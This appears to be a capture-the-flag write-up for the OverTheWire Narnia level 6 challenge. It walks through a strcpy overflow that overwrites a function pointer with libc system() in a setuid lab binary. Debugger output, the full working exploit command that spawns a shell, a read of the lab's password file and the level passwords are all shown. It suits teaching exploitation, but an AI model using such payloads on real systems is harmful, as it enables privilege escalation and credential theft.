# Narnia Level 5 → Level 6 strcpy() Buffer Overflow

## Previous Flag
<b>BNSjoSDeGL</b>

## Goal
Use previous password to log in SSH with user <b>narnia6</b> and port <b>2226</b> accessed on narnia.labs.overthewire.org.

There is no information for this level, intentionally.

## What I learned
```
C standard doesn’t officially include inline assembly, but GCC/Clang has it
    __asm__(...) same thing as asm(...)
        asm("movl %esp, %eax");
        __asm__("movl %esp, %eax");
int puts(const char *s);
puts function does not expect any format specifiers

int (*fp)(char *)=(int(*)(char *))&puts, i; 🧠 Function Pointer
    Declaration
        fp → variable name.
        (*fp)                       parentheses mean “fp is a pointer to …”
        (char *)                    function takes one parameter of type char *
        int                         returns an int
    Initialization
        &puts                       address of puts function from C standard library
        (int (*)(char *)) &puts     cast the address of puts to exact type int (*)(char *)
    i                               There to confuse us, int i

// fp can now be used
fp("Hello");                        same as puts("Hello")

memset() copies a single byte       So hard to overflow

/bin/sh                             7 bytes
/bin/bash                           9 bytes

libc is loaded in our binary and system() is part of libc
info proc mappings to check the base address of libc
    can be verified using the ldd command

nm command can find offset of system() in libc
    get offset from i386 libc
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh narnia6@narnia.labs.overthewire.org -p 2226 ⌨️
narnia6@narnia:~$ cd /narnia/ ⌨️
narnia6@narnia:/narnia$ file narnia6 ⌨️
narnia6: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=f7ac7e275daf04b3d0a7b1d96e24b95e60bb2a14, for GNU/Linux 3.2.0, not stripped
narnia6@narnia:/narnia$ cat narnia6.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {                        // Google: What movl do in assembly
       __asm__("movl %esp,%eax\n\t"                 // move stack pointer to eax register, Vulnerability since we control $esp
               "and $0xff000000, %eax"              // masking with 0xff000000
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int (*fp)(char *)=(int(*)(char *))&puts, i;    // Declaring and initializing a pointer to a function

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);                             // Vulnerability Here
        strcpy(b2,argv[2]);                             // Vulnerability Here
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
        fp(b1);

        exit(1);
}
narnia6@narnia:~$ whatis puts ⌨️
puts (3)             - output of characters and strings     # printf
narnia6@narnia:~$ man puts ⌨️
narnia6@narnia:/narnia$ ./narnia6 ⌨️
./narnia6 b1 b2
narnia6@narnia:/narnia$ ./narnia6 AAAA ⌨️
./narnia6 b1 b2
narnia6@narnia:/narnia$ ./narnia6 AAAA BBBB ⌨️
AAAA
narnia6@narnia:/narnia$ gdb -q narnia6 ⌨️
Reading symbols from narnia6...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n]) y ⌨️
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
Download failed: Permission denied.  Continuing without separate debug info for /narnia/narnia6.
--Type <RET> for more, q to quit, c to continue without paging--c
(No debugging symbols found in narnia6)
(gdb) disassemble main ⌨️
Dump of assembler code for function main:
   0x080491e3 <+0>:     push   %ebp
   0x080491e4 <+1>:     mov    %esp,%ebp
   0x080491e6 <+3>:     push   %ebx
   0x080491e7 <+4>:     sub    $0x18,%esp
   0x080491ea <+7>:     movl   $0x8049070,-0xc(%ebp)
   0x080491f1 <+14>:    cmpl   $0x3,0x8(%ebp)
--Type <RET> for more, q to quit, c to continue without paging--c
   0x080491f5 <+18>:    je     0x8049211 <main+46>
   0x080491f7 <+20>:    mov    0xc(%ebp),%eax
   0x080491fa <+23>:    mov    (%eax),%eax
   0x080491fc <+25>:    push   %eax
   0x080491fd <+26>:    push   $0x804a008
   0x08049202 <+31>:    call   0x8049040 <printf@plt>
   0x08049207 <+36>:    add    $0x8,%esp
   0x0804920a <+39>:    push   $0xffffffff
   0x0804920c <+41>:    call   0x8049080 <exit@plt>
   0x08049211 <+46>:    movl   $0x0,-0x8(%ebp)
   0x08049218 <+53>:    jmp    0x8049252 <main+111>
   0x0804921a <+55>:    mov    0x804b230,%eax
   0x0804921f <+60>:    mov    -0x8(%ebp),%edx
   0x08049222 <+63>:    shl    $0x2,%edx
   0x08049225 <+66>:    add    %edx,%eax
   0x08049227 <+68>:    mov    (%eax),%eax
   0x08049229 <+70>:    push   %eax
   0x0804922a <+71>:    call   0x80490a0 <strlen@plt>
   0x0804922f <+76>:    add    $0x4,%esp
   0x08049232 <+79>:    mov    0x804b230,%edx
   0x08049238 <+85>:    mov    -0x8(%ebp),%ecx
   0x0804923b <+88>:    shl    $0x2,%ecx
   0x0804923e <+91>:    add    %ecx,%edx
   0x08049240 <+93>:    mov    (%edx),%edx
   0x08049242 <+95>:    push   %eax
   0x08049243 <+96>:    push   $0x0
   0x08049245 <+98>:    push   %edx
   0x08049246 <+99>:    call   0x80490b0 <memset@plt>
   0x0804924b <+104>:   add    $0xc,%esp
   0x0804924e <+107>:   addl   $0x1,-0x8(%ebp)
   0x08049252 <+111>:   mov    0x804b230,%eax
   0x08049257 <+116>:   mov    -0x8(%ebp),%edx
   0x0804925a <+119>:   shl    $0x2,%edx
   0x0804925d <+122>:   add    %edx,%eax
   0x0804925f <+124>:   mov    (%eax),%eax
   0x08049261 <+126>:   test   %eax,%eax
   0x08049263 <+128>:   jne    0x804921a <main+55>
   0x08049265 <+130>:   movl   $0x3,-0x8(%ebp)
   0x0804926c <+137>:   jmp    0x80492a9 <main+198>
   0x0804926e <+139>:   mov    -0x8(%ebp),%eax
   0x08049271 <+142>:   lea    0x0(,%eax,4),%edx
   0x08049278 <+149>:   mov    0xc(%ebp),%eax
   0x0804927b <+152>:   add    %edx,%eax
   0x0804927d <+154>:   mov    (%eax),%eax
   0x0804927f <+156>:   push   %eax
   0x08049280 <+157>:   call   0x80490a0 <strlen@plt>
   0x08049285 <+162>:   add    $0x4,%esp
   0x08049288 <+165>:   mov    -0x8(%ebp),%edx
   0x0804928b <+168>:   lea    0x0(,%edx,4),%ecx
   0x08049292 <+175>:   mov    0xc(%ebp),%edx
   0x08049295 <+178>:   add    %ecx,%edx
   0x08049297 <+180>:   mov    (%edx),%edx
   0x08049299 <+182>:   push   %eax
   0x0804929a <+183>:   push   $0x0
   0x0804929c <+185>:   push   %edx
   0x0804929d <+186>:   call   0x80490b0 <memset@plt>
   0x080492a2 <+191>:   add    $0xc,%esp
   0x080492a5 <+194>:   addl   $0x1,-0x8(%ebp)
   0x080492a9 <+198>:   mov    -0x8(%ebp),%eax
   0x080492ac <+201>:   lea    0x0(,%eax,4),%edx
   0x080492b3 <+208>:   mov    0xc(%ebp),%eax
   0x080492b6 <+211>:   add    %edx,%eax
   0x080492b8 <+213>:   mov    (%eax),%eax
   0x080492ba <+215>:   test   %eax,%eax
   0x080492bc <+217>:   jne    0x804926e <main+139>
   0x080492be <+219>:   mov    0xc(%ebp),%eax
   0x080492c1 <+222>:   add    $0x4,%eax
   0x080492c4 <+225>:   mov    (%eax),%eax
   0x080492c6 <+227>:   push   %eax
   0x080492c7 <+228>:   lea    -0x14(%ebp),%eax
   0x080492ca <+231>:   push   %eax
   0x080492cb <+232>:   call   0x8049060 <strcpy@plt>
   0x080492d0 <+237>:   add    $0x8,%esp
   0x080492d3 <+240>:   mov    0xc(%ebp),%eax
   0x080492d6 <+243>:   add    $0x8,%eax
   0x080492d9 <+246>:   mov    (%eax),%eax
   0x080492db <+248>:   push   %eax
   0x080492dc <+249>:   lea    -0x1c(%ebp),%eax
   0x080492df <+252>:   push   %eax
   0x080492e0 <+253>:   call   0x8049060 <strcpy@plt>
   0x080492e5 <+258>:   add    $0x8,%esp
   0x080492e8 <+261>:   mov    -0xc(%ebp),%eax
   0x080492eb <+264>:   and    $0xff000000,%eax
   0x080492f0 <+269>:   mov    %eax,%ebx
   0x080492f2 <+271>:   call   0x80491d6 <get_sp>
   0x080492f7 <+276>:   cmp    %eax,%ebx
   0x080492f9 <+278>:   jne    0x8049302 <main+287>
   0x080492fb <+280>:   push   $0xffffffff
   0x080492fd <+282>:   call   0x8049080 <exit@plt>
   0x08049302 <+287>:   call   0x8049050 <geteuid@plt>
   0x08049307 <+292>:   mov    %eax,%ebx
   0x08049309 <+294>:   call   0x8049050 <geteuid@plt>
   0x0804930e <+299>:   push   %ebx
   0x0804930f <+300>:   push   %eax
   0x08049310 <+301>:   call   0x8049090 <setreuid@plt>
   0x08049315 <+306>:   add    $0x8,%esp
   0x08049318 <+309>:   lea    -0x14(%ebp),%eax
   0x0804931b <+312>:   push   %eax
   0x0804931c <+313>:   mov    -0xc(%ebp),%eax
   0x0804931f <+316>:   call   *%eax 👀
   0x08049321 <+318>:   add    $0x4,%esp
   0x08049324 <+321>:   push   $0x1
   0x08049326 <+323>:   call   0x8049080 <exit@plt>
End of assembler dump.
(gdb) break *main+316 ⌨️
Breakpoint 1 at 0x804931f
(gdb) info breakpoints ⌨️
Num     Type           Disp Enb Address    What      
1       breakpoint     keep y   0x0804931f <main+316>
(gdb) run "AAAAAAAA" "BBBBBBBB" ⌨️
Starting program: /narnia/narnia6 "AAAAAAAA" "BBBBBBBB"
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) info registers ⌨️
eax            0x8049000 👀        134516736
ecx            0x36b6              14006
edx            0x0                 0
ebx            0x36b6              14006
esp            0xffffd348          0xffffd348 👀 Address of sp but want to see
ebp            0xffffd368          0xffffd368
esi            0xffffd434          -11212
edi            0xf7ffcb60          -134231200
eip            0x804931f           0x804931f <main+316>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--c ⌨️
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0
(gdb) x/10wx 0xffffd348 ⌨️
0xffffd348:     0xffffd354      0x42424242      0x42424242      0x41414100
0xffffd358:     0x41414141      0x08049000      0x00000003      0xf7faae34
0xffffd368:     0x00000000      0xf7d9ecb9
(gdb) x/10wx $esp ⌨️
0xffffd348:     0xffffd354      0x42424242      0x42424242      0x41414100 👀 B B A (b2 variable)
0xffffd358:     0x41414141      0x08049000👀    0x00000003      0xf7faae34 👀 A $eax (b1 variable)(Higher Memory)
0xffffd368:     0x00000000      0xf7d9ecb9

# Goal: Overflow b1 register so it changes $eax register, since we move $esp into $eax register
# Add 4 C's to try overflow $eax
(gdb) run "AAAAAAAACCCC" "BBBBBBBB" ⌨️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia6 "AAAAAAAACCCC" "BBBBBBBB"
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) x/10wx $esp ⌨️
0xffffd348:     0xffffd354      0x42424242      0x42424242      0x41414100
0xffffd358:     0x41414141      0x43434343👀    0x00000000      0xf7faae34 👀 $eax got overflowed w/ C
0xffffd368:     0x00000000      0xf7d9ecb9
(gdb) info registers ⌨️
eax            0x43434343👀       1128481603
ecx            0x36b6              14006
edx            0x0                 0
ebx            0x36b6              14006
esp            0xffffd348          0xffffd348
ebp            0xffffd368          0xffffd368
esi            0xffffd434          -11212
edi            0xf7ffcb60          -134231200
eip            0x804931f           0x804931f <main+316>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--q ⌨️
Quit
(gdb) p system ⌨️❤️                                        # pointer to system()
$1 = {int (const char *)} 0xf7dca430👀 <__libc_system>      👀 Note: can skip Opitional calculate system addy section

# ---------------------- Optional ---------------------------------------------------
# Optional: Calculate system address (Method above easier)
# Check base address for libc
(gdb) info proc mapping ⌨️
process 690873
Mapped address spaces:

        Start Addr   End Addr       Size     Offset  Perms   objfile
         0x8048000  0x8049000     0x1000        0x0  r--p   /narnia/narnia6
         0x8049000  0x804a000     0x1000     0x1000  r-xp   /narnia/narnia6
         0x804a000  0x804b000     0x1000     0x2000  r--p   /narnia/narnia6
         0x804b000  0x804c000     0x1000     0x2000  rw-p   /narnia/narnia6
        0xf7d7a000 0xf7d9d000    0x23000        0x0  r--p   /usr/lib/i386-linux-gnu/libc.so.6 👀
        0xf7d9d000 0xf7f24000   0x187000    0x23000  r-xp   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7f24000 0xf7fa9000    0x85000   0x1aa000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7fa9000 0xf7fab000     0x2000   0x22f000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7fab000 0xf7fac000     0x1000   0x231000  rw-p   /usr/lib/i386-linux-gnu/libc.so.6
--Type <RET> for more, q to quit, c to continue without paging--c ⌨️
        0xf7fac000 0xf7fb6000     0xa000        0x0  rw-p
        0xf7fc1000 0xf7fc3000     0x2000        0x0  rw-p
        0xf7fc3000 0xf7fc7000     0x4000        0x0  r--p   [vvar]
        0xf7fc7000 0xf7fc9000     0x2000        0x0  r-xp   [vdso]
        0xf7fc9000 0xf7fca000     0x1000        0x0  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7fca000 0xf7fed000    0x23000     0x1000  r-xp   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7fed000 0xf7ffb000     0xe000    0x24000  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7ffb000 0xf7ffd000     0x2000    0x31000  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7ffd000 0xf7ffe000     0x1000    0x33000  rw-p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xfffdd000 0xffffe000    0x21000        0x0  rw-p   [stack]
(gdb) shell ⌨️
narnia6@narnia:/narnia$ ldd ./narnia6 ⌨️
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d7a000👀)
        /lib/ld-linux.so.2 (0xf7fc9000)
narnia6@narnia:/narnia$ whatis ldd ⌨️
ldd (1)              - print shared object dependencies
# Find offset address of system() using nm command
narnia6@narnia:/narnia$ whatis nm ⌨️
nm (1)               - list symbols from object files
narnia6@narnia:/narnia$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep system ⌨️
00050430 T __libc_system@@GLIBC_PRIVATE
0016e9d0 T svcerr_systemerr@GLIBC_2.0
00050430 W system@@GLIBC_2.0 👀

# Calculate system() address by doing libc_base + system()_offset
narnia6@narnia:/narnia$ python3 -c "print(hex(0xf7d7a000 + 0x00050430))" ⌨️
0xf7dca430
narnia6@narnia:/narnia$ printf "0x%x\n" $((0xf7d7a000 + 0x00050430)) ⌨️
0xf7dca430
# ---------------------- Optional ---------------------------------------------------

# Goal override $eax register w/ system memory to be able to run any system commands
(gdb) run $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBB") ⌨️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia6 $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBB")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) info registers ⌨️
eax            0xf7dca430 👀       -136534992
ecx            0x36b6              14006
edx            0x0                 0
ebx            0x36b6              14006
esp            0xffffd348          0xffffd348
ebp            0xffffd368          0xffffd368
esi            0xffffd434          -11212
edi            0xf7ffcb60          -134231200
eip            0x804931f           0x804931f <main+316>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--q ⌨️
Quit
(gdb) x/10wx $esp ⌨️
0xffffd348:     0xffffd354 👀   0x42424242      0x42424242      0x41414100
0xffffd358:     0x41414141      0xf7dca430      0x00000000      0xf7faae34
0xffffd368:     0x00000000      0xf7d9ecb9
(gdb) continue ⌨️
Continuing.
[Detaching after vfork from child process 578207] 👀 system has nothing to execute
[Inferior 1 (process 521152) exited with code 01]
(gdb) x/10wx $esp ⌨️
0xffffd348:     0xffffd354      0x42424242      0x42424242      0x41410043 👀 C
0xffffd358:     0x41414141      0xf7dca430      0x00000000      0xf7faae34
0xffffd368:     0x00000000      0xf7d9ecb9
(gdb) continue ⌨️
Continuing.
[Detaching after vfork from child process 602402]
sh: 1: C: not found 👀
[Inferior 1 (process 597953) exited with code 01]
(gdb) run $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBBls") ⌨️
Starting program: /narnia/narnia6 $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBBls")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) continue ⌨️
Continuing.
[Detaching after vfork from child process 603626]
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8 👀
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c 👀
[Inferior 1 (process 603536) exited with code 01]

(gdb) run $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBB/bin/bash") ⌨️
Starting program: /narnia/narnia6 $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBB/bin/bash")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) continue ⌨️
Continuing.

Program received signal SIGILL, Illegal instruction.
Download failed: Invalid argument.  Continuing without source file ./stdlib/./stdlib/strtod_l.c.
0xf7dc006c in __GI_____strtod_l_internal (nptr=0x0, endptr=0x0, group=0, loc=0x0) at ./stdlib/strtod_l.c:946
warning: 946    ./stdlib/strtod_l.c: No such file or directory

(gdb) run $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBB/bin/sh") ⌨️
Starting program: /narnia/narnia6 $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBB/bin/sh")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0804931f in main ()
(gdb) continue ⌨️
Continuing.
[Detaching after vfork from child process 606699]
$ whoami ⌨️
narnia6                                 # Note: this not the child process, didn't work in gdb
$ cat /etc/narnia_pass/narnia6 ⌨️
BNSjoSDeGL
$ exit ⌨️
[Inferior 1 (process 606486) exited with code 01]
(gdb) exit ⌨️
narnia6@narnia:/narnia$ ./narnia6 $(echo -e "AAAAAAAA\x30\xa4\xdc\xf7" "BBBBBBBB/bin/sh")
$ cat /etc/narnia_pass/narnia6 ⌨️
cat: /etc/narnia_pass/narnia6: Permission denied
$ whoami ⌨️
narnia7
$ cat /etc/narnia_pass/narnia7 ⌨️
54RtepCEU0 🔐                           # Note: worked outside gdb
$ ps aux ⌨️
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
narnia7   609271  0.0  0.0   2800  1664 pts/29   S    20:11   0:00 sh -c -- /bin/sh
narnia7   609272  0.0  0.0   2800  1792 pts/29   S    20:11   0:00 /bin/sh
narnia7   613541  0.0  0.1   7892  4096 pts/29   R+   20:13   0:00 ps aux
$ exit ⌨️
narnia6@narnia:/narnia$ ps aux ⌨️
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
narnia6   502748  0.0  0.1   9200  5760 pts/29   Ss   19:47   0:00 -bash
narnia6   617524  0.0  0.1  10884  4480 pts/29   R+   20:14   0:00 ps aux
```

## Flag
<b>54RtepCEU0</b>

## Continue
[Continue](./Narnia0607.md)